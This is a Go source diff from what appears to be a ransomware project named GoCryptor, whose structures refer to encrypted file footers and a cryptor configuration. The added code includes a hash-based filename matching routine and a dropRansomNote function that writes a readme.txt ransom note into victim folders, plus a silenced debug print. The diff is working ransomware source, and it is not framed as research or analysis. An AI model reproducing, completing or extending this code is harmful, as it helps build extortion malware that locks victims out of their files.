@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"encoding/gob"
+	"errors"
 	"fmt"
 	"log"
 	"os"
@@ -180,7 +181,7 @@ func encodeToBytes(p interface{}) []byte {
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Println("uncompressed size (bytes): ", len(buf.Bytes()))
+	// fmt.Println("uncompressed size (bytes): ", len(buf.Bytes()))
 	return buf.Bytes()
 }
 
@@ -193,4 +194,36 @@ func decodeToEncryptedFileFooter(s []byte) EncryptedFileFooter {
 		log.Fatal(err)
 	}
 	return p
+}
+
+// Return true if name is in hash list
+func checkNameInHashList(name string, hashList []uint32) bool {
+	nameHash := bufferHashing([]byte(strings.ToLower(name)))
+	for _, hash := range hashList {
+		if nameHash == hash {
+			return true
+		}
+	}
+	return false
+}
+
+func dropRansomNote(folderDir string) {
+	if _, err := os.Stat(folderDir + "\\readme.txt"); !errors.Is(err, os.ErrNotExist) {
+		// fmt.Println("Already exists", folderDir+"\\readme.txt")
+		return
+	}
+	ransomNote, err := os.Create(folderDir + "\\readme.txt")
+
+	if err != nil {
+		// fmt.Println("Can't create")
+		return
+	}
+
+	defer ransomNote.Close()
+
+	_, err2 := ransomNote.WriteString(string(GoCryptorConfig.ransomNoteContent))
+
+	if err2 != nil {
+		return
+	}
 }
